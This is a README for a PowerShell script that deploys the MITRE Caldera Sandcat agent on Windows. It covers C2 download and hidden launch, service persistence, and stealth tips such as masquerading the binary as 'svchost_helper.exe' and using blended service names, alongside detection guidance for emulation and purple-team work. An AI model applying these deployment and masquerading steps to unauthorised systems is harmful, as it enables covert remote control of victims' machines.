# Deploy-SandcatAgent

> PowerShell deployment script for the [MITRE Caldera](https://github.com/mitre/caldera) **Sandcat** agent on Windows endpoints.  
> Designed for adversary emulation exercises, purple team operations, and detection engineering workflows.

---

## ⚠️ Authorisation Warning

This tooling is intended **exclusively** for use against systems you own or have explicit written authorisation to test. Deploying agent software on systems without authorisation violates computer fraud laws in most jurisdictions (e.g., CFAA, Computer Misuse Act, GDPR Article 32). The authors accept no liability for misuse.

---

## Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Prerequisites](#prerequisites)
- [Parameters](#parameters)
- [Usage](#usage)
- [C2 Channel Selection](#c2-channel-selection)
- [Persistence via Windows Service](#persistence-via-windows-service)
- [Operational Security Considerations](#operational-security-considerations)
- [Detection Opportunities](#detection-opportunities)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)

---

## Overview

`Deploy-SandcatAgent.ps1` automates the full agent lifecycle on a Windows target:

1. Validates reachability of the Caldera C2 server via the `/ping` endpoint.
2. Pulls a pre-compiled `sandcat.exe` from the Caldera server's `/file/download` endpoint, targeting the `windows` platform.
3. Strips the Mark-of-the-Web (MotW) ADS via `Unblock-File`.
4. Either spawns the agent as a hidden background process **or** installs it as a persistent Windows service (NSSM preferred, `sc.exe` fallback).

The script is parameterised for lab, staging, and simulated production environments. It does **not** handle lateral movement or credential material — deployment is expected to be driven by an orchestration layer (Ansible, GPO, SCCM, manual execution).

---

## Architecture

```
┌─────────────────────────────────┐        ┌──────────────────────────────┐
│         Caldera Server          │        │        Windows Target         │
│  (Linux / Docker / WSL2)        │        │                              │
│                                 │        │  Deploy-SandcatAgent.ps1     │
│  ┌───────────┐  ┌────────────┐  │◄──────►│    │                         │
│  │  REST API │  │ /file/     │  │  HTTP  │    ├─ GET /ping              │
│  │  :8888    │  │ download   │  │        │    ├─ GET /file/download     │
│  └───────────┘  └────────────┘  │        │    └─ Launch sandcat.exe     │
│                                 │        │           │                  │
│  ┌────────────────────────────┐ │        │           │ beacon           │
│  │       Agent Manager        │ │◄───────┤───────────┘                  │
│  │  (beacon / tasking / C2)   │ │        │                              │
│  └────────────────────────────┘ │        └──────────────────────────────┘
└─────────────────────────────────┘
```

The agent checks in on its configured beacon interval (default: 60 s jitter), receives tasks from the planner, executes abilities, and exfiltrates results back to the server. All comms are over the selected C2 channel.

---

## Prerequisites

### Caldera Server

| Requirement | Notes |
|---|---|
| Caldera ≥ 4.1.0 | Sandcat plugin must be enabled (`plugins: [sandcat]` in `conf/local.yml`) |
| Sandcat plugin compiled | Requires Go 1.19+ on the Caldera host; run `pip3 install -r requirements.txt && python3 server.py` |
| Network reachability | Target must be able to reach the Caldera server on the configured port (default `8888`) |

### Target Windows Host

| Requirement | Notes |
|---|---|
| PowerShell 5.1+ | Ships with Windows 10 / Server 2016 and later |
| Administrator privileges | Required — the script enforces `#Requires -RunAsAdministrator` |
| .NET Framework 4.5+ | Needed for `System.Net.WebClient`; present on all supported Windows versions |
| Execution policy | Must allow script execution — see [Usage](#usage) |
| NSSM *(optional)* | Recommended for service installation; download from [nssm.cc](https://nssm.cc) and place on `$PATH` |

---

## Parameters

| Parameter | Type | Required | Default | Description |
|---|---|----------|---|---|
| `-CalderaServer` | `string` | yes      | — | Base URL of the Caldera server including scheme and port. Must match `^https?://`. |
| `-Group` | `string` | no       | `red` | Agent group to enrol into. Corresponds to Caldera's group concept used by adversary profiles. |
| `-C2Channel` | `string` | no       | `http` | Contact channel for C2 comms. One of: `http`, `udp`, `tcp`, `websocket`. |
| `-InstallAsService` | `switch` | no       | `$false` | Installs the agent as a persistent Windows service with auto-start. |
| `-ServiceName` | `string` | no       | `CalderaSandcat` | Display and registry name for the Windows service. Rename for operational blending. |
| `-AgentPath` | `string` | no       | `C:\Windows\Temp\sandcat.exe` | Filesystem path where the agent binary is written. |
| `-Proxy` | `string` | no       | `""` | HTTP proxy URL for download and beacon traffic (e.g., `http://proxy.corp.local:8080`). |

---

## Usage

### 1. Verify Caldera is running

```bash
# On the Caldera host
python3 server.py --insecure
curl http://localhost:8888/ping   # expected: "pong"
```

### 2. Set execution policy on the target (if needed)

```powershell
# Process-scoped — does not persist
Set-ExecutionPolicy RemoteSigned -Scope Process -Force
```

### 3. Deploy the agent

**Basic — ephemeral process, HTTP C2:**
```powershell
.\Deploy-SandcatAgent.ps1 -CalderaServer "http://192.168.10.100:8888"
```

**Specify group and C2 channel:**
```powershell
.\Deploy-SandcatAgent.ps1 `
    -CalderaServer "http://192.168.10.100:8888" `
    -Group         "red" `
    -C2Channel     "websocket"
```

**Persistent service with a blended service name:**
```powershell
.\Deploy-SandcatAgent.ps1 `
    -CalderaServer  "http://192.168.10.100:8888" `
    -Group          "red" `
    -InstallAsService `
    -ServiceName    "WinTelemetryHelper"
```

**Egress via corporate proxy:**
```powershell
.\Deploy-SandcatAgent.ps1 `
    -CalderaServer "http://192.168.10.100:8888" `
    -Proxy         "http://proxy.corp.local:8080"
```

**Custom drop path:**
```powershell
.\Deploy-SandcatAgent.ps1 `
    -CalderaServer "http://192.168.10.100:8888" `
    -AgentPath     "C:\ProgramData\Microsoft\WinSAT\sandcat.exe"
```

### 4. Verify agent check-in

Log in to the Caldera web UI → **Agents** tab. The new agent should appear within one beacon interval (default ≈ 60 s). Confirm:

- Hostname matches the target.
- Group assignment is correct.
- Architecture (`amd64` / `386`) is as expected.

---

## C2 Channel Selection

Sandcat supports multiple contact protocols. Choose based on the environment's network controls:

| Channel | Protocol | Port (default) | Notes |
|---|---|---|---|
| `http` | HTTP/HTTPS | 8888 | Default. Widest firewall compatibility. Use with TLS termination (reverse proxy) in prod-sim environments. |
| `websocket` | WebSocket over HTTP | 8888 | Persistent connection; lower beacon jitter. Recommended when HTTP deep inspection is a concern. |
| `tcp` | Raw TCP | 7010 | Useful when HTTP/S is filtered but outbound TCP is not. Requires the TCP contact plugin. |
| `udp` | UDP | 7011 | Lossy; use only when TCP is unavailable. Requires the UDP contact plugin. |

To enable non-HTTP channels, ensure the corresponding Caldera contact plugin is loaded in `conf/local.yml`:

```yaml
plugins:
  - sandcat
contacts:
  - http
  - websocket
  - tcp
  - udp
```

---

## Persistence via Windows Service

When `-InstallAsService` is passed, the script attempts two approaches in order:

### Option A — NSSM (preferred)

[NSSM](https://nssm.cc) wraps arbitrary executables as proper Windows services with restart supervision.

```
nssm install <ServiceName> <AgentPath> -server <URL> -group <group>
nssm set     <ServiceName> Start SERVICE_AUTO_START
nssm set     <ServiceName> AppRestartDelay 5000
nssm start   <ServiceName>
```

NSSM is detected via `Get-Command nssm.exe`. Place it on `$PATH` or in the same directory as the script before running.

### Option B — `sc.exe` with batch wrapper (fallback)

When NSSM is unavailable, the script writes a restart-loop batch file alongside the agent binary and registers it with `sc.exe`:

```
<AgentPath>.bat   ← restart loop wrapper
sc.exe create <ServiceName> binPath= "cmd.exe /c <wrapper.bat>" start= auto
```

> **Note:** The `sc.exe` approach spawns `cmd.exe` as the service host. This is detectable by EDR and should only be used in environments where service host masquerading is not a detection objective.

### Removing the service

```powershell
Stop-Service -Name "WinTelemetryHelper" -Force
sc.exe delete "WinTelemetryHelper"
```

---

## Operational Security Considerations

These notes apply to purple team and red team scenarios where detection fidelity matters.

### Stealth adjustments

| Default Behaviour | Modification |
|---|---|
| Agent dropped to `C:\Windows\Temp\` | Use `-AgentPath` to write to a less-scrutinised path (e.g., `C:\ProgramData\<vendor>\`) |
| Agent binary named `sandcat.exe` | Rename post-download: `Rename-Item $AgentPath "svchost_helper.exe"` |
| `-v` verbose flag set | Remove the `-v` flag from `$args` in `Start-SandcatProcess` for quieter process arguments |
| Service named `CalderaSandcat` | Use `-ServiceName` to blend with existing services |
| Binary downloaded over plain HTTP | Front Caldera behind an nginx reverse proxy with a valid TLS cert |
| `Unblock-File` call visible in logs | Expected and benign-looking; no modification needed |

### What this script does NOT do

- **No AV/EDR evasion** — Sandcat is a well-known tool and will be flagged by most endpoint products without modification. Use [Caldera's obfuscation options](https://caldera.readthedocs.io/en/latest/Learning-the-terminology.html#obfuscators) or compile a custom agent variant.
- **No in-memory execution** — the binary is written to disk. For fileless delivery, use Caldera's `54ndc47` agent with reflective loading techniques.
- **No credential harvesting** — deployment is assumed to be driven by an existing foothold or orchestration layer.
- **No lateral movement** — invoke the script per-target via WinRM, PSExec, or GPO startup scripts.

---

## Detection Opportunities

For blue team and detection engineering use: the following events are generated by this script and its resulting agent activity. Validate that your SIEM/EDR stack captures them.

| Event | Source | Details |
|---|---|---|
| `sandcat.exe` written to disk | Sysmon Event ID 11 | `TargetFilename` matches `AgentPath` |
| `Unblock-File` / ADS deletion | Sysmon Event ID 23 / Windows Security 4663 | `:Zone.Identifier` stream deleted from agent binary |
| Outbound HTTP to C2 | Sysmon Event ID 3 / FW logs | `DestinationPort: 8888`, `Image: sandcat.exe` |
| Process creation with hidden window | Sysmon Event ID 1 | `sandcat.exe -server … -group …`, `WindowStyle: Hidden` |
| Service creation via `sc.exe` | Windows Security Event ID 7045 | `ServiceName` matches `-ServiceName` parameter |
| NSSM service registration | Windows Security Event ID 7045 | `ServiceFileName` points to `nssm.exe` |
| Periodic beacon traffic | Network / proxy logs | Regular outbound intervals — default jitter 30–90 s |

**MITRE ATT&CK coverage generated by the script itself (pre-ability execution):**

| Technique | ID |
|---|---|
| Ingress Tool Transfer | T1105 |
| Web Protocols (C2) | T1071.001 |
| Create or Modify System Process: Windows Service | T1543.003 |
| Hide Artifacts: Hidden Window | T1564.003 |

---

## Troubleshooting

**`Cannot reach Caldera server`**  
Verify the server is running (`python3 server.py`), the port is open (`Test-NetConnection -ComputerName <IP> -Port 8888`), and Windows Firewall or network ACLs are not blocking the connection.

**`Access to the path is denied`**  
The script requires an elevated session. Confirm you are running PowerShell as Administrator.

**`AuthorizationManager check failed` / execution policy error**  
Run `Set-ExecutionPolicy RemoteSigned -Scope Process -Force` before invoking the script, or call it directly with `powershell.exe -ExecutionPolicy Bypass -File .\Deploy-SandcatAgent.ps1 …`.

**Agent binary is 0 bytes**  
The Sandcat plugin may not be compiled. On the Caldera server: `cd plugins/sandcat && go build -o sandcat.go .` or restart the server and let it compile on first use.

**Agent does not appear in the UI after launch**  
Check that the `-Group` value exists in Caldera (or create it). Review `sandcat` stdout by temporarily removing `-psi.WindowStyle = Hidden` and redirecting output. Confirm the beacon interval hasn't been set excessively high in the server config.

**Service installs but immediately stops**  
If using the `sc.exe` fallback, verify that `cmd.exe` can resolve the wrapper batch path. Run the batch file manually in a shell to observe the error. Consider installing NSSM instead.

---

## References

- [MITRE Caldera Documentation](https://caldera.readthedocs.io/)
- [Sandcat Plugin Source](https://github.com/mitre/sandcat)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NSSM — the Non-Sucking Service Manager](https://nssm.cc)
- [Sysmon Configuration Reference](https://github.com/SwiftOnSecurity/sysmon-config)
